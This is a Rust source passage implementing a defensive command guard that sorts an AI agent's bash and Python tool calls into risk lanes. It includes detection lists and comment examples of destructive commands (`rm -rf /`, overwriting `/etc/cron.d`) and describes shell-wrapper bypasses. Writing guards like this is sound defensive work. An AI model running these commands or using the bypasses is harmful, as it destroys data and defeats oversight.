//! Command guard — a pre-dispatch safety gate over the Lucidos Agent's
//! bash/python tools (`run_bash`, `run_bash_background`, `run_python`,
//! `run_python_background`).
//!
//! See ADR 0002 (`docs/adr/0002-lucidos-agent-command-safety.md`) and the
//! design / phased-implementation docs (`docs/plans/2026-06-08-agent-command-
//! safety-*.md`).
//!
//! Classification is two-tier (the hybrid of ADR 0002):
//!
//!  * [`static_classify`] is the deterministic, zero-cost pass. It settles the
//!    two ends — the catastrophic deny-list (`Settled(Catastrophic)`,
//!    hard-blocked) and an obviously-safe positive allowlist (`Settled(Safe)`,
//!    run now) — and hands the *ambiguous middle* to the judge as `NeedsJudge`.
//!  * The LLM *judge* (Phase 3, `engine::command_judge`) classifies that middle
//!    into `Safe` / `ReversibleDanger` / `IrreversibleDanger`, erring toward
//!    ask. When the judge is off or unavailable, [`fallback_classify`] degrades
//!    to the static lists: the "dangerous" side-effect shapes
//!    ([`static_side_effect_category`]) plus a destruction scan
//!    (out-of-workspace target → ask, in-workspace → checkpoint).
//!
//! `IrreversibleDanger` on a chat channel pauses to ask the user (mirroring the
//! coding-agent permission model — see `engine::command_permission`).
//! `ReversibleDanger` snapshots the workspace on a safety ref and runs, leaving
//! a one-click Undo (Phase 4).
//!
//! The whole gate is off unless the workspace turns on the `command_guard`
//! preference, so it ships dark; the judge has its own `command_guard_judge`
//! sub-toggle and a configurable `model_command_judge`.

use crate::llm::tool_names as tn;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::sync::LazyLock;

/// How dangerous a single bash/python command is, and therefore how the command
/// guard treats it. The static [`static_classify`] fast-path only ever settles
/// [`RiskLane::Safe`] and [`RiskLane::Catastrophic`]; the LLM *judge* (Phase 3)
/// classifies the ambiguous middle into [`RiskLane::Safe`],
/// [`RiskLane::ReversibleDanger`], or [`RiskLane::IrreversibleDanger`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RiskLane {
    /// Run immediately, no gate. The default for everything not flagged below.
    Safe,
    /// A pattern no legitimate workflow needs — recursive deletion of the
    /// filesystem root or home directory, a fork bomb, formatting a filesystem,
    /// or overwriting a raw block device. Hard-blocked; the reason is fed back
    /// to the LLM as a failed tool result.
    Catastrophic,
    /// Destruction confined to the workspace (an in-workspace `rm`/overwrite) —
    /// recoverable from version control. Produced by the judge or by the static
    /// fallback's destruction scan; handled by snapshotting the workspace on a
    /// safety ref before running, leaving a one-click Undo (Phase 4).
    ReversibleDanger,
    /// A command that may cause an irreversible real-world side-effect (sending
    /// mail, a mutating HTTP request, a cloud-CLI mutation) or out-of-workspace
    /// destruction. On a chat channel the guard pauses and asks the user
    /// (mirroring the coding agent); the user can Allow once / for the thread /
    /// always.
    IrreversibleDanger,
}

/// The kind of irreversible real-world side-effect a command may perform. Only
/// meaningful for [`RiskLane::IrreversibleDanger`]: the LLM *judge* tags each
/// irreversible command with a category (the static fallback derives one for
/// the shapes it recognises), and an unattended *trigger* runs the command only
/// if its declared **side-effect grant** contains that category (ADR 0002,
/// Phase 5). A chat turn always asks the user, regardless of category.
///
/// Wire form is snake_case (`email`, `external_api`, …) — it rides on the
/// `TriggerCreated` / `TriggerUpdated` payload's `side_effect_grant` array and
/// in the judge's JSON `category` field.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SideEffectCategory {
    /// Sending email or messages — `mail`/`mailx`/`sendmail`, `osascript`
    /// driving Mail/Messages, Python `smtplib`.
    Email,
    /// A mutating outbound HTTP request — `curl`/`wget` POST/PUT/DELETE/PATCH or
    /// a data upload, Python `requests`/`httpx`/`session` writes.
    ExternalApi,
    /// A cloud-service mutation via the `gh`, `aws`, or `gcloud` CLIs.
    CloudCli,
    /// Deleting or overwriting files OUTSIDE the workspace — irreversible (no
    /// checkpoint is possible). Tagged by the judge, or by the static
    /// fallback's destruction scan when the judge is off (see
    /// [`fallback_classify`]).
    OutOfWorkspaceDestruction,
    /// An irreversible side-effect that doesn't fit the named categories — the
    /// judge's catch-all, and the fallback when the judge can't categorise. A
    /// trigger must grant `other` to run such a command.
    Other,
}

impl SideEffectCategory {
    /// Noun phrase for LLM-facing refusal / card text — reads as "may perform
    /// {reason}".
    pub fn reason(&self) -> &'static str {
        match self {
            Self::Email => {
                "an email or messaging side-effect (mail, sendmail, or AppleScript driving Mail/Messages)"
            }
            Self::ExternalApi => {
                "a mutating HTTP request (POST/PUT/DELETE/PATCH or a data upload)"
            }
            Self::CloudCli => "a cloud-service mutation via gh, aws, or gcloud",
            Self::OutOfWorkspaceDestruction => "destruction of files outside the workspace",
            Self::Other => "an irreversible real-world side-effect",
        }
    }

    /// Short user-facing label for the trigger side-effect-grant UI. Kept in
    /// sync with the frontend `SIDE_EFFECT_CATEGORIES` list (a `/harden` check
    /// would flag drift between the wire values and the UI).
    pub fn label(&self) -> &'static str {
        match self {
            Self::Email => "Send email or messages",
            Self::ExternalApi => "Call external APIs (mutating HTTP)",
            Self::CloudCli => "Cloud CLI mutations (gh / aws / gcloud)",
            Self::OutOfWorkspaceDestruction => "Destroy files outside the workspace",
            Self::Other => "Other irreversible side-effects",
        }
    }
}

/// The outcome of the static (zero-cost, deterministic) classification pass.
/// Either the lane is settled outright, or the command is the *ambiguous
/// middle* and is handed to the LLM judge.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum StaticVerdict {
    /// Settled by static rules — use this lane, never consult the judge.
    Settled(RiskLane),
    /// The static fast-path can't confidently settle this command; the judge
    /// (or, when the judge is off/unavailable, the static fallback) decides.
    NeedsJudge(JudgeInput),
}

/// Everything the judge (or the static fallback) needs to classify one
/// ambiguous command: the tool it came from, the command text itself, and the
/// out-of-workspace risk signal computed by the static pass.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JudgeInput {
    pub tool_name: String,
    pub command: String,
    /// True when the static pass saw a filesystem target / redirect escaping the
    /// workspace — a *risk signal* the judge weighs (out-of-workspace
    /// destruction is irreversible), not a verdict on its own.
    pub out_of_workspace: bool,
}

impl JudgeInput {
    /// Stable per-turn cache key — same tool + same command text re-judges to
    /// the same verdict, so the agentic loop caches by this string.
    pub fn cache_key(&self) -> String {
        format!("{}\u{0}{}", self.tool_name, self.command)
    }
}

/// A resolved classification ready to act on: the final lane plus, when the
/// judge produced one, its tailored one-line summary for the permission card
/// (`None` falls back to the static [`permission_summary`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JudgedClassification {
    pub lane: RiskLane,
    pub summary: Option<String>,
    /// The side-effect category — set only when `lane == IrreversibleDanger`
    /// (the judge tags it; the static fallback derives it for known shapes,
    /// defaulting to [`SideEffectCategory::Other`]). Drives the trigger
    /// side-effect-grant check; `None` for every non-irreversible lane.
    pub category: Option<SideEffectCategory>,
}

/// Unwrap a single shell `-c`-style wrapper so the inner script is what gets
/// classified.
///
/// Both classifiers inspect each segment's HEAD token and do NOT descend into a
/// shell `-c`/`-lc` payload, so a wrapped command would read as head `zsh`/`bash`
/// and bypass every check. Codex sends commands pre-wrapped as
/// `/bin/zsh -lc '<script>'`; a chat `run_bash` can be handed the same shape.
/// Returns the original command when it isn't a recognized shell wrapper (Claude
/// Code's `Bash` passes the raw command, which falls through unchanged).
pub(crate) fn unwrap_shell_command(command: &str) -> &str {
    const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "ash"];
    let trimmed = command.trim_start();
    let Some(first) = trimmed.split_whitespace().next() else {
        return command;
    };
    let base = first.rsplit('/').next().unwrap_or(first);
    if !SHELLS.contains(&base) {
        return command;
    }
    // Walk whitespace-delimited tokens (with byte offsets) to find the `-c`-style
    // flag; everything after it is the script. One quote layer is stripped so the
    // common `zsh -lc 'curl ...'` form classifies as a clean `curl ...`.
    let bytes = trimmed.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        let start = i;
        while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        if start == i {
            break;
        }
        if is_shell_c_flag(&trimmed[start..i]) {
            return shell_script_operand(trimmed[i..].trim());
        }
    }
    command
}

/// A single-dash cluster of shell option letters that includes `c`: `-c`, `-lc`,
/// `-ic`, `-lic`, etc. Rejects long options and non-shell flags (`-config`,
/// `-l`).
fn is_shell_c_flag(tok: &str) -> bool {
    match tok.strip_prefix('-') {
        Some(letters) if tok.len() >= 2 && !tok.starts_with("--") => {
            letters.contains('c') && letters.chars().all(|ch| "clixeasfm".contains(ch))
        }
        _ => false,
    }
}

/// Take the script operand that follows a shell `-c` flag.
///
/// In `sh -c <script> [$0 [arg ...]]` the script is ONE word, and anything after
/// it sets `$0` and the positional parameters. So the close quote is not
/// necessarily the last character: `bash -c 'rm -rf /' ignored` really does run
/// `rm -rf /`. Cutting at the matching close quote (rather than only unwrapping
/// when the quotes surround the whole remainder) is what keeps that form from
/// presenting a head token of `'rm` and slipping past every head-token scan.
///
/// An unquoted or unterminated operand is returned as-is: there is no full shell
/// parser here, and the classifiers downstream are the ones that must stay
/// conservative.
fn shell_script_operand(s: &str) -> &str {
    let b = s.as_bytes();
    if b.len() >= 2 && (b[0] == b'\'' || b[0] == b'"') {
        let quote = b[0] as char;
        // `find` returns a byte offset relative to `s[1..]`, and both it and the
        // opening quote are ASCII, so these are real char boundaries.
        if let Some(end) = s[1..].find(quote) {
            return &s[1..1 + end];
        }
    }
    s
}

/// The static, deterministic, zero-cost classification pass.
///
/// Only the four bash/python command-running tools are inspected; every other
/// tool is `Settled(Safe)` (the guard never gates reads, edits, HTTP, etc.).
/// Settles the two ends of the spectrum and hands the middle to the judge:
///   * catastrophic deny-list → `Settled(Catastrophic)` (hard-block),
///   * obviously read-only / in-workspace-write shapes → `Settled(Safe)`,
///   * everything else → `NeedsJudge` (the judge classifies it, or the static
///     fallback does when the judge is off — see [`fallback_classify`]).
///
/// Catastrophic wins over everything (checked first), so a command that is both
/// catastrophic and side-effect-shaped is hard-blocked rather than judged.
pub fn static_classify(tool_name: &str, input: &Value) -> StaticVerdict {
    let Some(raw) = command_text(tool_name, input) else {
        return StaticVerdict::Settled(RiskLane::Safe);
    };
    // Classify the INNER script of a `sh -c '<script>'` wrapper. Every check
    // below reads each segment's head token and does not descend into the
    // payload, so without this a wrapped `bash -c 'rm -rf /'` reads as head
    // `bash`, skips the catastrophic hard-block entirely, and (with the judge
    // off) falls all the way through to Safe. The coding-agent lane has always
    // unwrapped; this is the same call for the chat lane.
    let cmd = unwrap_shell_command(raw);
    if catastrophic_reason(cmd).is_some() {
        return StaticVerdict::Settled(RiskLane::Catastrophic);
    }
    let is_bash = matches!(tool_name, tn::RUN_BASH | tn::RUN_BASH_BACKGROUND);
    let statically_safe = if is_bash {
        bash_is_statically_safe(cmd)
    } else {
        python_is_statically_safe(cmd)
    };
    if statically_safe {
        return StaticVerdict::Settled(RiskLane::Safe);
    }
    StaticVerdict::NeedsJudge(JudgeInput {
        tool_name: tool_name.to_string(),
        command: cmd.to_string(),
        // The out-of-workspace marker is a bash-only path heuristic; Python code
        // is handed to the judge verbatim, which reads any paths from the code.
        out_of_workspace: is_bash && command_escapes_workspace(cmd),
    })
}

/// The classification for an ambiguous command when the judge is off or
/// unavailable. Static, deterministic coverage in priority order:
///
///   1. an obvious side-effect shape ([`static_side_effect_category`]) →
///      `IrreversibleDanger` with that category (ask on chat, grant-check on a
///      trigger),
///   2. a destruction shape with an out-of-workspace target →
///      `IrreversibleDanger` + [`SideEffectCategory::OutOfWorkspaceDestruction`]
///      (no checkpoint can cover it),
///   3. a destruction shape confined to the workspace → `ReversibleDanger`
///      (checkpoint + run — no prompt),
///   4. everything else → `Safe` (the Phase-2 default: run it).
///
/// Coarser than the judge by construction — `sed -i`, `find -delete`,
/// `rsync --delete`, and destruction behind a variable path are residuals only
/// the judge catches — but the headline screwups (`rm` / `mv` / `cp` / `dd` /
/// a truncating redirect onto a path outside the workspace) no longer run
/// silently when the judge is off.
pub fn fallback_classify(ji: &JudgeInput) -> JudgedClassification {
    if let Some(cat) = static_side_effect_category(&ji.command) {
        return JudgedClassification {
            lane: RiskLane::IrreversibleDanger,
            summary: Some(format!("May perform {}.", cat.reason())),
            category: Some(cat),
        };
    }
    let is_bash = matches!(
        ji.tool_name.as_str(),
        tn::RUN_BASH | tn::RUN_BASH_BACKGROUND
    );
    let scope = if is_bash {
        bash_destruction_scope(&ji.command)
    } else {
        python_destruction_scope(&ji.command)
    };
    match scope {
        Some(DestructionScope::OutOfWorkspace) => JudgedClassification {
            lane: RiskLane::IrreversibleDanger,
            summary: Some(format!(
                "May perform {}.",
                SideEffectCategory::OutOfWorkspaceDestruction.reason()
            )),
            category: Some(SideEffectCategory::OutOfWorkspaceDestruction),
        },
        Some(DestructionScope::InWorkspace) => JudgedClassification {
            lane: RiskLane::ReversibleDanger,
            summary: None,
            category: None,
        },
        None => JudgedClassification {
            lane: RiskLane::Safe,
            summary: None,
            category: None,
        },
    }
}

// --- Static destruction scan (fallback coverage for the judge-off path) -----

/// Where a statically-detected destruction lands.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DestructionScope {
    /// Confined to the workspace — recoverable via checkpoint.
    InWorkspace,
    /// Touches a target outside the workspace — no checkpoint can cover it.
    OutOfWorkspace,
}

/// Heads that destroy or overwrite every path argument they're given.
static DESTRUCTIVE_HEADS: &[&str] = &["rm", "rmdir", "unlink", "shred", "truncate"];
/// Heads whose LAST argument is overwritten — the preceding args are read-only
/// sources, and out-of-workspace reads are a wanted feature.
static DESTRUCTIVE_DEST_HEADS: &[&str] = &["mv", "cp"];

/// The destruction scope of a whole command line: out-of-workspace wins over
/// in-workspace (one un-checkpointable segment poisons the line), `None` when
/// no segment has a destruction shape.
fn bash_destruction_scope(command: &str) -> Option<DestructionScope> {
    let mut found_in_ws = false;
    for segment in command_segments(command) {
        match segment_destruction_scope(&segment) {
            Some(DestructionScope::OutOfWorkspace) => {
                return Some(DestructionScope::OutOfWorkspace)
            }
            Some(DestructionScope::InWorkspace) => found_in_ws = true,
            None => {}
        }
    }
    found_in_ws.then_some(DestructionScope::InWorkspace)
}

/// Destruction scope of one shell segment, or `None`. Skips the same benign
/// prefixes the other scans do, so `sudo rm -rf /etc/x` is seen.
fn segment_destruction_scope(segment: &str) -> Option<DestructionScope> {
    // A truncating redirect (`>`, not `>>`) onto a path outside the workspace
    // overwrites it — destruction no checkpoint covers. Append (`>>`) is an
    // out-of-workspace EDIT (wanted), and in-workspace overwrite redirects are
    // settled Safe upstream, so neither lands here.
    if truncating_redirect_escapes(segment) {
        return Some(DestructionScope::OutOfWorkspace);
    }
    let toks: Vec<&str> = segment.split_whitespace().collect();
    let i = command_head_index(&toks);
    let head = toks.get(i)?;
    let base = head.rsplit('/').next().unwrap_or(head);
    if base == "dd" {
        // dd overwrites its `of=` target (a block-device target is already
        // caught by the catastrophic scan upstream). No `of=` → stdout → not
        // destruction.
        let of_target = toks[i + 1..].iter().find_map(|a| a.strip_prefix("of="));
        return of_target.map(|t| {
            if !path_in_workspace(t) && !is_harmless_redirect(t) {
                DestructionScope::OutOfWorkspace
            } else {
                DestructionScope::InWorkspace
            }
        });
    }
    let args: Vec<&str> = toks[i + 1..]
        .iter()
        .copied()
        .filter(|a| !a.starts_with('-'))
        .collect();
    if DESTRUCTIVE_HEADS.contains(&base) {
        return Some(if args.iter().any(|a| token_escapes_workspace(a)) {
            DestructionScope::OutOfWorkspace
        } else {
            DestructionScope::InWorkspace
        });
    }
    if DESTRUCTIVE_DEST_HEADS.contains(&base) && args.len() >= 2 {
        return Some(if args.last().is_some_and(|a| token_escapes_workspace(a)) {
            DestructionScope::OutOfWorkspace
        } else {
            DestructionScope::InWorkspace
        });
    }
    None
}

/// True when the segment has a TRUNCATING output redirect (`>`, not `>>`)
/// whose target is a path outside the workspace.
fn truncating_redirect_escapes(segment: &str) -> bool {
    REDIRECT_RE.captures_iter(segment).any(|c| {
        let whole = c.get(0).map(|m| m.as_str()).unwrap_or("");
        let target = c.get(1).map(|m| m.as_str()).unwrap_or("");
        !whole.contains(">>") && !path_in_workspace(target) && !is_harmless_redirect(target)
    })
}

/// The destruction sub-set of the Python side-effect signals — calls that
/// delete, move, or truncate files. Split out of the judge-routing signal list
/// so the fallback can derive a lane from them.
static PY_DESTRUCTION_CALLS: &[&str] = &[
    "os.remove(",
    "os.unlink(",
    "os.rmdir(",
    "os.removedirs(",
    "os.rename(",
    "os.replace(",
    "os.truncate(",
    "shutil.rmtree(",
    "shutil.move(",
    ".unlink(",
    ".rmdir(",
];

/// Destruction scope of Python `code`, or `None`. A destruction call paired
/// with any string literal that looks like an escaping path (absolute, `~`, or
/// `..` traversal) is out-of-workspace; with only relative literals it's
/// in-workspace (checkpointable). Coarse on purpose: the literal needn't be
/// the destruction call's own argument — a stray absolute path alongside an
/// unrelated delete errs toward ask, the fallback's documented direction. A
/// destruction call on a pure variable path stays in-workspace (the checkpoint
/// covers the common case; the judge covers the rest when it's on).
fn python_destruction_scope(code: &str) -> Option<DestructionScope> {
    if !PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s)) {
        return None;
    }
    Some(if python_string_literal_escapes(code) {
        DestructionScope::OutOfWorkspace
    } else {
        DestructionScope::InWorkspace
    })
}

/// True when any quoted string literal in `code` looks like a path escaping
/// the workspace.
fn python_string_literal_escapes(code: &str) -> bool {
    static LITERAL: LazyLock<regex::Regex> =
        LazyLock::new(|| regex::Regex::new(r#"'([^']*)'|"([^"]*)""#).unwrap());
    LITERAL.captures_iter(code).any(|c| {
        let s = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str())
            .unwrap_or("");
        s.starts_with('/') || s.starts_with('~') || s == ".." || s.contains("../")
    })
}

/// The STOP message handed back to the LLM when a catastrophic command is
/// refused. Re-derives the specific reason so the model learns exactly what
/// tripped the guard; falls back to a generic phrase if extraction fails.
pub fn catastrophic_refusal(tool_name: &str, input: &Value) -> String {
    let reason = command_text(tool_name, input)
        .and_then(catastrophic_reason)
        .unwrap_or("a catastrophic, irreversible operation");
    format!(
        "Refused by the command guard — this command was NOT run. It matches {reason}, which is \
         irreversible and no legitimate task needs it. Do not retry it; choose a different, safe \
         approach (for example, operate only on specific paths inside the workspace's data/ \
         directory)."
    )
}

/// The command guard's pre-dispatch decision for one bash/python tool call.
/// Produced by `LucidosEngine::command_guard_decision` (see
/// `engine::command_permission`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardDecision {
    /// Run the command normally.
    Proceed,
    /// Block this command and hand `message` back to the LLM as a failed tool
    /// result (catastrophic hard-block or a chat Deny) — the turn continues so
    /// the model can route around it.
    Refuse(String),
    /// Block this command AND fail the whole trigger run (ADR 0002, Phase 5): an
    /// unattended trigger hit an `IrreversibleDanger` command whose side-effect
    /// category isn't in its grant. The agentic loop records the block as a
    /// failed tool result, emits a terminal `ResponseFailed`, and returns `Err`
    /// so the scheduler's failure-notification path surfaces it. Only ever
    /// produced on the `Trigger` channel.
    FailTrigger(String),
}

/// Extract the inspectable command text from a tool call: the `command` field
/// for the bash tools, the `code` field for the python tools. `None` for any
/// other tool (the guard does not inspect it).
pub fn command_text<'a>(tool_name: &str, input: &'a Value) -> Option<&'a str> {
    let field = match tool_name {
        tn::RUN_BASH | tn::RUN_BASH_BACKGROUND => "command",
        tn::RUN_PYTHON | tn::RUN_PYTHON_BACKGROUND => "code",
        _ => return None,
    };
    input.get(field).and_then(Value::as_str)
}

// ===========================================================================
// Static "obviously safe" fast-path.
//
// A POSITIVE allowlist of shapes that are safe regardless of the judge: reads,
// in-workspace writes/creates, downloads (GET), and read-only git. The
// allowlist is fail-SAFE — anything not on it falls through to the judge (which
// classifies it correctly, at the cost of one cheap LLM call), so a missing
// entry costs latency, never safety. The breadth here is a pure tuning knob:
// widening it moves more common commands off the judge without changing what's
// gated. Deliberately ABSENT: anything that can spawn/eval arbitrary code (sh,
// bash, eval, xargs, awk, sed -i, find -exec, perl/ruby/node -e, python) — it
// would let a dangerous payload ride in unclassified.
// ===========================================================================

/// Command heads that only ever read or transform-to-stdout — safe regardless of
/// their arguments (output redirects are validated separately by [`segment_is_safe`]).
static READ_ONLY_HEADS: &[&str] = &[
    // Listing / inspection (`find` is NOT here — `find -delete`/`-exec` mutate)
    "ls",
    "dir",
    "vdir",
    "tree",
    "stat",
    "file",
    "du",
    "df",
    "pwd",
    "realpath",
    "readlink",
    "basename",
    "dirname",
    // Reading / dumping file content
    "cat",
    "tac",
    "nl",
    "head",
    "tail",
    "wc",
    "less",
    "more",
    "strings",
    "od",
    "hexdump",
    "xxd",
    "look",
    // Text search / transform to stdout
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "ag",
    "ack",
    "sort",
    "uniq",
    "cut",
    "tr",
    "fold",
    "fmt",
    "expand",
    "unexpand",
    "column",
    "comm",
    "join",
    "paste",
    "rev",
    "jq",
    "yq",
    "diff",
    "cmp",
    "base64",
    // Hashing
    "md5",
    "md5sum",
    "sha1sum",
    "sha256sum",
    "sha512sum",
    "shasum",
    "cksum",
    "b2sum",
    // System info (read-only)
    "echo",
    "printf",
    "printenv",
    "date",
    "cal",
    "whoami",
    "who",
    "id",
    "groups",
    "hostname",
    "uname",
    "arch",
    "uptime",
    "which",
    "type",
    "whereis",
    "getconf",
    "locale",
    "free",
    "vm_stat",
    "sw_vers",
    "ps",
    "pgrep",
    "uuidgen",
    "tput",
    "clear",
    "tty",
    // Trivial builtins / no-ops
    "true",
    "false",
    "sleep",
    "seq",
    "test",
    "[",
    "expr",
];

/// Command heads that create or extend in-workspace paths — safe when every
/// path argument stays inside the workspace.
static CREATE_HEADS: &[&str] = &["mkdir", "touch"];

/// Read-only `git` subcommands. Anything mutating (`push`, `commit`, `reset`,
/// `branch -D`, `config <k> <v>`, `tag <name>`, `remote add`, …) is absent and
/// falls through to the judge.
static GIT_READ_ONLY_SUBCOMMANDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "reflog",
    "rev-parse",
    "rev-list",
    "ls-files",
    "ls-tree",
    "cat-file",
    "show-ref",
    "describe",
    "shortlog",
    "whatchanged",
    "grep",
    "var",
    "count-objects",
    "fsck",
    "version",
];

/// True when every shell segment of `command` is an obviously-safe shape. One
/// not-safe segment poisons the whole line (a chained `&&`/`|` could smuggle a
/// dangerous command after a safe one).
fn bash_is_statically_safe(command: &str) -> bool {
    command_segments(command).all(|s| segment_is_safe(&s))
}

/// Whether one shell command segment is obviously safe.
fn segment_is_safe(segment: &str) -> bool {
    // An output redirect to a path outside the workspace is a write outside the
    // workspace — not safe, even behind a read-only head (`grep x f > /etc/y`).
    // Harmless device sinks (`/dev/null`, std streams) are exempt.
    if redirect_targets(segment).any(|t| !path_in_workspace(t) && !is_harmless_redirect(t)) {
        return false;
    }
    // Command/process substitution executes an embedded command under whatever
    // head precedes it — never settle it Safe; the judge sees the full text.
    if has_command_substitution(segment) {
        return false;
    }
    let toks: Vec<&str> = segment.split_whitespace().collect();
    let i = command_head_index(&toks);
    let Some(head) = toks.get(i) else {
        // Only benign prefixes / redirects — no command runs.
        return true;
    };
    let base = head.rsplit('/').next().unwrap_or(head);
    let args = &toks[i + 1..];
    match base {
        "git" => git_subcommand_read_only(args),
        // A GET/download is safe unless it writes its output to a path outside
        // the workspace (`curl -o /etc/cron.d/evil …`).
        "curl" | "wget" => !is_mutating_http(args) && !segment_escapes_workspace(segment),
        _ if READ_ONLY_HEADS.contains(&base) => true,
        _ if CREATE_HEADS.contains(&base) => args
            .iter()
            .filter(|a| !a.starts_with('-'))
            .all(|a| path_in_workspace(a)),
        _ => false,
    }
}

/// True when `args` (the tokens after `git`) name a read-only subcommand,
/// skipping leading global flags (`-C <dir>`, `--no-pager`, …).
fn git_subcommand_read_only(args: &[&str]) -> bool {
    let mut i = 0;
    while let Some(&arg) = args.get(i) {
        // Global flags that can inject an executable under a read-only
        // subcommand — never statically safe; let the judge see them.
        //   `-c k=v` / `--config-env`: an executable config (pager, editor,
        //     sshCommand, alias).
        //   `--exec-path[=<dir>]`: redirects where git resolves `git-<sub>`.
        if arg == "-c"
            || arg == "--config-env"
            || arg.starts_with("--config-env=")
            || arg == "--exec-path"
            || arg.starts_with("--exec-path=")
        {
            return false;
        }
        match arg {
            // Flags that take a separate value argument.
            "-C" | "--git-dir" | "--work-tree" | "--namespace" => i += 2,
            a if a.starts_with('-') => i += 1,
            _ => break,
        }
    }
    args.get(i)
        .is_some_and(|sub| GIT_READ_ONLY_SUBCOMMANDS.contains(sub))
}

/// True when `code` is statically safe Python: no signal of a real-world
/// side-effect or arbitrary shell-out. Pure compute, data crunching, and file
/// reads/in-workspace writes have no signal and run without the judge; anything
/// with a network-write / mail / subprocess / eval shape falls through to it.
fn python_is_statically_safe(code: &str) -> bool {
    !python_side_effect_signal(code)
}

/// Heuristic signal that Python `code` may have a real-world side-effect or run
/// arbitrary shell — broader than [`python_side_effect_category`] (which is the
/// definite-write set used for the static fallback summary). A match routes the
/// code to the judge, which reads the actual call to decide the lane.
fn python_side_effect_signal(code: &str) -> bool {
    const SIGNALS: &[&str] = &[
        // Network writes — generic `.post(`-style method shapes, so a renamed
        // client (`s = requests.Session(); s.post(…)`, an httpx client, an SDK
        // wrapper) is caught regardless of the variable name. A false positive
        // (e.g. `queue.put(`) only costs one judge call, never a wrong verdict.
        ".post(",
        ".put(",
        ".patch(",
        ".delete(",
        "urllib.request.urlopen(",
        "aiohttp",
        "pycurl",
        // Mail / remote-execution / cloud SDKs — side-effect-capable libraries
        // whose mere mention is a strong talk-to-the-world signal.
        "smtplib",
        "boto3",
        "google.cloud",
        "paramiko",
        "ftplib",
        "telnetlib",
        // Arbitrary shell-out / eval (incl. dynamic-import indirection)
        "subprocess",
        "os.system(",
        "os.popen(",
        "os.exec",
        "pty.spawn(",
        "eval(",
        "exec(",
        "__import__(",
    ];
    // Filesystem destruction / move (PY_DESTRUCTION_CALLS) also routes to the
    // judge — it reads the path to decide the lane (in-workspace → reversible,
    // out-of-workspace → irreversible); the static fallback derives the same
    // split from string literals via `python_destruction_scope`. (Plain
    // `open(path, "w")` writes are left as a known residual — flagging every
    // file write would tax routine data output, and an out-of-workspace
    // open-write is an implausible screwup.)
    SIGNALS.iter().any(|s| code.contains(s))
        || PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s))
}

// --- Out-of-workspace marker + path helpers --------------------------------

/// True when any segment of `command` touches a filesystem path or redirect
/// outside the workspace. A *risk signal* passed to the judge — NOT a verdict
/// (an out-of-workspace read is wanted; only destruction is a threat).
pub fn command_escapes_workspace(command: &str) -> bool {
    command_segments(command).any(|s| segment_escapes_workspace(&s))
}

fn segment_escapes_workspace(segment: &str) -> bool {
    // Redirect targets (covers glued forms like `>/etc/y` the token scan misses)…
    if redirect_targets(segment).any(|t| !path_in_workspace(t) && !is_harmless_redirect(t)) {
        return true;
    }
    // …plus any token that names a path outside the workspace.
    segment.split_whitespace().any(token_escapes_workspace)
}

/// True when a single token names a path outside the workspace — either as a
/// bare path argument (`/etc/x`, `../y`, `~/z`) or as the value of a `--flag=PATH`
/// glued option (`--output=/etc/x`). The short-glued flag form (`-o/etc/x`)
/// needs per-flag knowledge and is a known residual — the common space-separated
/// (`-o /etc/x`) and `=`-glued forms are both covered here.
fn token_escapes_workspace(tok: &str) -> bool {
    if is_pathish(tok) && !path_in_workspace(tok) && !is_harmless_redirect(tok) {
        return true;
    }
    if let Some((_flag, value)) = tok.split_once('=') {
        if is_pathish(value) && !path_in_workspace(value) && !is_harmless_redirect(value) {
            return true;
        }
    }
    false
}

/// True when a token looks like a filesystem path (so its location is worth
/// checking) — contains a `/` (but is not a URL), or is `..`, or starts with
/// `~`. Flags are excluded.
fn is_pathish(token: &str) -> bool {
    let t = token.trim_matches(|c| c == '"' || c == '\'');
    if t.starts_with('-') {
        return false;
    }
    if t.starts_with('~') || t == ".." || t.starts_with("../") {
        return true;
    }
    t.contains('/') && !t.contains("://")
}

/// True when a path stays inside the workspace (the agent's cwd). Conservative:
/// absolute paths, home-relative paths, any `..` traversal, and any path with a
/// `$VAR` component (which can resolve anywhere) are treated as escaping. A
/// bare or `./`-relative literal path is in-workspace.
fn path_in_workspace(token: &str) -> bool {
    let t = token.trim_matches(|c| c == '"' || c == '\'');
    if t.starts_with('/') || t.starts_with('~') || t.contains('$') {
        return false;
    }
    !t.split('/').any(|seg| seg == "..")
}

/// True for redirect targets that don't write to a real file — the null sink
/// and the standard streams. (Raw block devices are caught by the catastrophic
/// scan, not here.)
fn is_harmless_redirect(target: &str) -> bool {
    let t = target.trim_matches(|c| c == '"' || c == '\'');
    matches!(t, "/dev/null" | "/dev/stdout" | "/dev/stderr" | "/dev/tty")
}

/// Output-redirect matcher (`>`, `>>`, `2>`, `&>`, …) capturing the target
/// path. fd-duplications (`2>&1`) yield no path (the `&` stops the capture).
/// Shared by [`redirect_targets`] (any redirect) and
/// [`truncating_redirect_escapes`] (which inspects the full match to exclude
/// appends).
static REDIRECT_RE: LazyLock<regex::Regex> =
    LazyLock::new(|| regex::Regex::new(r#"(?:\d*|&)>>?\s*['"]?([^\s'"|&;<>]+)"#).unwrap());

/// The path targets of output redirects in a segment.
fn redirect_targets(segment: &str) -> impl Iterator<Item = &str> {
    REDIRECT_RE
        .captures_iter(segment)
        .filter_map(|c| c.get(1).map(|m| m.as_str()))
}

/// If `command` matches a catastrophic pattern, return a short human-readable
/// reason (used both for the verdict and for the refusal message). `None` means
/// not catastrophic.
///
/// Deliberately narrow: only universally-destructive patterns no legitimate task
/// needs. Out-of-workspace deletion of a *specific* path (e.g. `rm -rf /etc`) is
/// NOT caught here — it belongs to the ask/judge lane in a later phase, not the
